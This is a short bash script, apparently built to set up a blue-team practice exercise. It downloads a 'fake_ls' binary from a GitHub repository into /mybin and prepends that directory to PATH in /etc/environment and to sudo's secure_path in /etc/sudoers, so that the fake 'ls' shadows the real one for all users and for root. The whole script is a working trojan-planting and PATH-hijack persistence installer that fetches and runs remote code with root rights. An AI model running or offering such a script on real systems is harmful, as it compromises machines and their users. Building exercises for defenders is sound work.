#!/usr/bin/env bash

set -e

URL="https://github.com/acebird/BlueTeam-Practice/raw/refs/heads/main/fake_ls"
TARGET_DIR="/mybin"
TARGET_FILE="$TARGET_DIR/ls"
ENV_FILE="/etc/environment"
SUDOERS_FILE="/etc/sudoers"

echo "[+] Creating $TARGET_DIR"
sudo mkdir -p "$TARGET_DIR"

echo "[+] Downloading fake ls"
sudo curl -L "$URL" -o "$TARGET_FILE"

echo "[+] Making executable"
sudo chmod +x "$TARGET_FILE"

#################################################
# Edit /etc/environment PATH
#################################################

echo "[+] Editing PATH in $ENV_FILE"

sudo cp "$ENV_FILE" "$ENV_FILE.bak"

if sudo grep -q '^PATH=' "$ENV_FILE"; then
    # Only prepend if not already present
    if ! sudo grep -q '^PATH="/mybin:' "$ENV_FILE"; then
        sudo sed -i 's#^PATH="#PATH="/mybin:#' "$ENV_FILE"
    fi
else
    echo 'PATH="/mybin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' | sudo tee -a "$ENV_FILE"
fi

#################################################
# Edit sudo secure_path
#################################################

echo "[+] Editing sudo secure_path"

sudo cp "$SUDOERS_FILE" "$SUDOERS_FILE.bak"

# Check if secure_path exists
if sudo grep -q 'secure_path' "$SUDOERS_FILE"; then
    # Add /mybin to front if not already there
    if ! sudo grep -q 'secure_path="/mybin:' "$SUDOERS_FILE"; then
        sudo sed -i 's#secure_path="#secure_path="/mybin:#' "$SUDOERS_FILE"
    fi
else
    echo 'Defaults secure_path="/mybin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' | sudo tee -a "$SUDOERS_FILE"
fi

echo "[+] Done"
echo "[!] Log out and back in for environment PATH changes"
